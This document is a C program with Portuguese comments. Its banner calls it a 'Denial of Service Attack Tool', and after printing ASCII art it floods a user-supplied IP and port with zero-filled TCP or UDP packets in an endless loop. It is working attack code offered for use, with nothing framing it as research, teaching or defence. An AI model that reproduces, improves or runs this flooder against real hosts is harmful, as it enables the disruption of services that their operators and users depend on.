// Código completo incluindo as partes necessárias
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

// Definir códigos de cor
#define RESET "\033[0m"        // Resetar cor padrão
#define RED "\033[31m"         // Vermelho
#define GREEN "\033[32m"       // Verde
#define YELLOW "\033[33m"      // Amarelo
#define BLUE "\033[34m"        // Azul
#define CYAN "\033[36m"        // Ciano

// Função para imprimir a Arte 1
void imprimir_arte_1() {
    printf(GREEN"    .-.        \\/   ()_()     .-.     \n" RESET);
    printf(GREEN"  c(O_O)c     (OO)  (O o)   c(O_O)c   \n" RESET);
    printf(GREEN" ,'.---.`,  ,'.--.)  |^_\\  ,'.---.`,  \n" RESET);
    printf(GREEN"/ /|_|_|\\ \\/ /|_|_\\  |(_))/ /|_|_|\\ \\ \n" RESET);
    printf(GREEN"| \\_____/ || \\_.--.  |  / | \\_____/ | \n" RESET);
    printf(GREEN"'. `---' .`'.   \\) \\ )|\\\\ '. `---' .` \n" RESET);
    printf(GREEN"  `-...-'    `-.(_.'(/  \\)  `-...-'   \n" RESET);
    printf(RED  "   Denial of Service Attack Tool\n" RESET);
    printf(BLUE "          by: Yuri Andrade\n"RESET);
    printf("\n");
}

// Função para imprimir a Arte 2
void imprimir_arte_2() {
    printf(CYAN"                                      .-.\n" RESET);
    printf(CYAN"            ,                     .-' ,c'.\n" RESET);
    printf(CYAN"         __rK                    _)a  7  ;\n" RESET);
    printf(CYAN"        /  ~,)                  (_,      (\n" RESET);
    printf(CYAN"      _;   /a(                   |_.    :'\n" RESET);
    printf(CYAN"      L/\\.'__/                   \\       ' )nnnK-.\n" RESET);
    printf(CYAN"      S  / (_                  .- L,-'   .dHHHb   |\n" RESET);
    printf(CYAN"      S( '\\_\\\\                / dHb'----'dHHHHb    \\\n" RESET);
    printf(CYAN"      S \\  ,  )      _,-._   / dHHHb\"x.dHHHHHHb     \\\n" RESET);
    printf(CYAN"      S |'. '.______/_U/_ '.-z/dHHHp   'dHHHHHb\\     |\n" RESET);
    printf(CYAN"     [H |  '..___.--'._C__  ) |         dHHHHHHb\\ _   \\\n" RESET);
    printf(CYAN"     /| |_  | \\     L/'--._/_ ;                  k '  /\n" RESET);
    printf(CYAN"     |//- '-. ---.__         '|                 /     |\n" RESET);
    printf(CYAN"      (       '-.   '.        |               _'-.  _/\n" RESET);
    printf(CYAN"  ..\"' `.,  _ ,  :  | \\      _\\             ,/ ,  '/\n" RESET);
    printf(CYAN".\"       ':   .     : |   .-' '',          : |/(/\\]/\n" RESET);
    printf(CYAN"          \\  /:  '  | :  /_      '...... .'/      |\n" RESET);
    printf(CYAN"           |     |  : / .' '--.__,     __.'\\      /\n" RESET);
    printf(CYAN"           |   : ;  |/ |         '----'L,  |     /\n" RESET);
    printf(CYAN"            \\  : .   \\  '-.________ /   ]  |____/\n" RESET);
    printf(CYAN"            L_____'..'           _.7' _/  <,    >\n" RESET);
    printf(CYAN"                                <___.'     /    \\\n" RESET);
    printf(CYAN"                                           \\____/\n" RESET);
    printf("\n");
}

// Função para imprimir as duas artes juntas
void imprimir_ascii_arts() {
    imprimir_arte_1();
    imprimir_arte_2();
}

// Função principal
int main(int argc, char *argv[]) {
    int sock;
    struct sockaddr_in alvo;
    char *pacote;
    int porta, tam_pacote, protocolo;
    int conexao;

    // Imprimir as duas artes no início
    imprimir_ascii_arts();
    
    if (argc < 5) {
        // Exibir o uso com cores: IP em vermelho, porta em azul, tamanho do pacote em amarelo, protocolo em verde
        printf(RED "Uso: %s " RESET "<" RED "IP do alvo" RESET "> <" BLUE "porta" RESET "> <" YELLOW "tamanho do pacote" RESET "> <" GREEN "tcp/udp" RESET ">\n", argv[0]);
        exit(1);
    }
    
    // IP do alvo
    alvo.sin_family = AF_INET;
    alvo.sin_addr.s_addr = inet_addr(argv[1]);
    
    // Porta de destino
    porta = atoi(argv[2]);
    alvo.sin_port = htons(porta);
    
    // Tamanho do pacote
    tam_pacote = atoi(argv[3]);
    if (tam_pacote <= 0 || tam_pacote > 65507) { // Verificar o tamanho do pacote
        printf(RED "Tamanho do pacote deve ser entre 1 e 65507 bytes\n" RESET);
        exit(1);
    }

    pacote = malloc(tam_pacote);
    if (pacote == NULL) { // Verificar se a alocação foi bem-sucedida
        perror(RED "Falha ao alocar memória" RESET);
        exit(1);
    }
    memset(pacote, 0, tam_pacote);  // Preenche o pacote com zeros

    // Determinar o protocolo (TCP ou UDP)
    if (strcmp(argv[4], "tcp") == 0) {
        // Criando o socket TCP
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            perror(RED "Erro ao criar socket" RESET);
            free(pacote); // Liberar memória alocada antes de sair
            exit(1);
        }

        // Tentativa de conexão ao servidor
        conexao = connect(sock, (struct sockaddr *)&alvo, sizeof(alvo));
        if (conexao < 0) {
            perror(RED "Falha na conexão com o servidor" RESET);
            close(sock); // Fechar o socket em caso de erro
            free(pacote);
            exit(1);
        }

        int pacotes_enviados = 0; // Contador de pacotes enviados

        // Loop para envio contínuo de pacotes TCP
        while (1) {
            if (send(sock, pacote, tam_pacote, 0) < 0) {
                perror(RED "Falha ao enviar pacote" RESET);
                break;
            }
            pacotes_enviados++;
            printf(GREEN "Pacote TCP enviado para %s:%d (Total: %d pacotes)\n" RESET, argv[1], porta, pacotes_enviados);
            usleep(1000); // Pausa de 1 ms entre os envios
        }

    } else if (strcmp(argv[4], "udp") == 0) {
        // Criando o socket UDP
        sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) {
            perror(RED "Erro ao criar socket" RESET);
            free(pacote); // Liberar memória alocada antes de sair
            exit(1);
        }

        int pacotes_enviados = 0; // Contador de pacotes enviados

        // Loop para envio contínuo de pacotes UDP
        while (1) {
            if (sendto(sock, pacote, tam_pacote, 0, (struct sockaddr*)&alvo, sizeof(alvo)) < 0) {
                perror(RED "Falha ao enviar pacote" RESET);
                break;
            }
            pacotes_enviados++;
            printf(GREEN "Pacote UDP enviado para %s:%d (Total: %d pacotes)\n" RESET, argv[1], porta, pacotes_enviados);
            usleep(1000); // Pausa de 1 ms entre os envios
        }

    } else {
        printf(RED "Protocolo inválido. Use 'tcp' ou 'udp'.\n" RESET);
        free(pacote); // Liberar memória alocada antes de sair
        exit(1);
    }

    // Fechar o socket e liberar a memória
    close(sock);
    free(pacote);
    return 0;
}
